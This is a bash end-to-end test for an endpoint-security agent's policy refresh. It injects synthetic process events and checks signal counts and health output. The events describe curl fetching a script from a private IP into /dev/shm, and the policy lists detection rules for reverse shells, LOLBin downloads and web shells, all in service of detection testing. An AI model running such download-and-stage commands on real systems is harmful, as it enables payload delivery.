#!/usr/bin/env bash
set -euo pipefail

source "$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)/../../harness/lib/common.sh"

sa_init_repo_paths
TMP="$(sa_make_tmp sysarmor-policy-agent-refresh)"
sa_pick_ports 40000 2000
TOKEN="${SYSARMOR_DEV_TOKEN:-dev-token}"
SCENARIO="policy-agent-refresh"
AGENT_ID="policy-refresh-agent"
HOST_ID="policy-refresh-host"
SA_TEST_NAME="e2e-policy-agent-refresh"
SA_WAIT_LOGS=("$TMP/agent.log" "$TMP/manager.log")

cleanup() {
  exec 3>&- 2>/dev/null || true
  sa_kill_pid_ref AGENT_PID
  sa_kill_pid_ref MGR_PID
  sa_cleanup_tmp "$TMP"
}
trap cleanup EXIT

echo "[e2e-policy-agent-refresh] building binaries"
sa_build_all

sa_start_memory_manager --dev-token "$TOKEN"

wait_contains() {
  sa_wait_contains "$@"
}

wait_payload_count() {
  local want="$1"
  local out="$2"
  local deadline=$((SECONDS + 10))
  while true; do
    "$BIN/sysarmorctl" --manager-url "$MGR_URL" --json manager signals list --label scenario="$SCENARIO" --layer endpoint > "$out"
    local got
    got="$({ grep -o 'payload_dropped' "$out" || true; } | wc -l | tr -d ' ')"
    if [[ "$got" == "$want" ]]; then
      return
    fi
    if (( SECONDS >= deadline )); then
      echo "[e2e-policy-agent-refresh][ERROR] payload_dropped count = $got, want $want" >&2
      cat "$out" >&2
      cat "$TMP/agent.log" >&2 2>/dev/null || true
      exit 1
    fi
    sleep 0.2
  done
}

sa_wait_url_contains "$MGR_URL/healthz" '"ok":true' "$TMP/health.json"

cat > "$TMP/no-payload-policy.json" <<'JSON'
{
  "policy_id": "no-payload-after-refresh",
  "version": 2,
  "tenant_id": "default",
  "endpoint_rules": [
    "web_runtime_spawns_shell",
    "download_by_lolbin",
    "reverse_shell_pattern",
    "suspicious_exec_connect"
  ],
  "cloud_rules": [
    "dropped_payload_executed_and_connects",
    "web_shell_chain"
  ],
  "mode": "observe",
  "converge": {
    "mode": "rarity_structural",
    "top_k": 8,
    "max_path_hops": 6,
    "cross_lineage": true
  },
  "published": true
}
JSON

curl -sf -X POST "$MGR_URL/api/v1/policies" \
  -H 'Content-Type: application/json' \
  --data-binary @"$TMP/no-payload-policy.json" > "$RESULTS/e2e-policy-agent-refresh.policy.json"

cat > "$TMP/collection.yaml" <<'POLICY'
{"behaviors":["file.write"],"observe_only":true}
POLICY

mkfifo "$TMP/events.pipe"
cat > "$TMP/agent.yaml" <<EOF
agent:
  id: $AGENT_ID
  host_id: $HOST_ID
  tenant_id: default
  token: $TOKEN
  scenario: $SCENARIO
manager:
  address: 127.0.0.1:$GRPC_PORT
  transport: grpc
sensor:
  backend: tetragon
  mode: managed
  version: test
  policy_path: $TMP/collection.yaml
  event_source: $TMP/events.pipe
  observe_only: true
spool:
  path: $TMP/spool
  max_bytes: 1048576
  batch_size: 10
  flush_interval: 200ms
data_plane:
  retry_initial: 10ms
  retry_max: 20ms
  request_timeout: 2s
health:
  interval: 1s
policy:
  refresh_interval: 200ms
EOF

"$BIN/sysarmor-agent" run --config "$TMP/agent.yaml" > "$TMP/agent.log" 2>&1 &
AGENT_PID=$!
exec 3>"$TMP/events.pipe"
wait_contains "agent default policy" 'policy=default-edr-policy version=1 mode=observe' "$RESULTS/e2e-policy-agent-refresh.agent-start.txt" \
  grep -F 'policy=default-edr-policy version=1 mode=observe' "$TMP/agent.log"

printf '%s\n' '{"process_exec":{"process":{"pid":100,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-16T10:00:00Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-16T09:59:59Z"}},"node_name":"node-a","time":"2026-06-16T10:00:00Z"}' >&3
wait_payload_count 1 "$RESULTS/e2e-policy-agent-refresh.signals-before.json"

cat > "$TMP/assignment.json" <<JSON
{
  "tenant_id": "default",
  "agent_id": "$AGENT_ID",
  "policy_id": "no-payload-after-refresh",
  "policy_version": 2
}
JSON

curl -sf -X POST "$MGR_URL/api/v1/policy-assignments" \
  -H 'Content-Type: application/json' \
  --data-binary @"$TMP/assignment.json" > "$RESULTS/e2e-policy-agent-refresh.assignment.json"

wait_contains "agent refreshed policy" 'agent policy refreshed: policy=no-payload-after-refresh version=2 mode=observe' "$RESULTS/e2e-policy-agent-refresh.agent-refresh.txt" \
  grep -F 'agent policy refreshed: policy=no-payload-after-refresh version=2 mode=observe' "$TMP/agent.log"

printf '%s\n' '{"process_exec":{"process":{"pid":101,"uid":0,"binary":"/usr/bin/curl","arguments":"-s http://10.66.0.99:8080/x.sh -o /dev/shm/x.sh","start_time":"2026-06-16T10:00:01Z"},"parent":{"pid":99,"binary":"/bin/bash","start_time":"2026-06-16T09:59:59Z"}},"node_name":"node-a","time":"2026-06-16T10:00:01Z"}' >&3
sleep 0.6
wait_payload_count 1 "$RESULTS/e2e-policy-agent-refresh.signals-after.json"

wait_contains "agent health refreshed policy" '"policy_id":"no-payload-after-refresh"' "$RESULTS/e2e-policy-agent-refresh.health.json" \
  "$BIN/sysarmorctl" --manager-url "$MGR_URL" --json manager health get --tenant-id default --agent-id "$AGENT_ID"
if ! grep -Fq '"policy_version":2' "$RESULTS/e2e-policy-agent-refresh.health.json"; then
  echo "[e2e-policy-agent-refresh][ERROR] health missing refreshed policy version" >&2
  cat "$RESULTS/e2e-policy-agent-refresh.health.json" >&2
  exit 1
fi

cp "$TMP/agent.log" "$RESULTS/e2e-policy-agent-refresh.agent.log"
cp "$TMP/manager.log" "$RESULTS/e2e-policy-agent-refresh.manager.log"
echo "[e2e-policy-agent-refresh] ok"
